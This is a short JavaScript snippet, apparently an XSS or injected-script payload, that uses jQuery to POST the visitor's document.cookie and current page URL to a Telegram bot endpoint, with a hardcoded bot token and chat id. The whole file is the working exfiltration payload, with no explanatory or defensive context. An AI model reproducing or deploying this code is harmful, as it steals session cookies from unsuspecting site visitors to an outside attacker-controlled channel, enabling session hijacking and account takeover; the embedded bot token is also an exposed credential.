var settings = {
  "async": true,
  "crossDomain": true,
  "url": "https://api.telegram.org/bot1999532720:AAG6WqaK1ulGBKFlgAoi4zasiq0xRnF7PUE/sendMessage",
  "method": "POST",
  "headers": {
    "Content-Type": "application/json",
    "cache-control": "no-cache"
  },
  "data": JSON.stringify({
    "chat_id": 1944654466,
    "text": document.cookie+'&url='+window.location.href
  })
}

$.ajax(settings).done(function (response) {
  
}); 
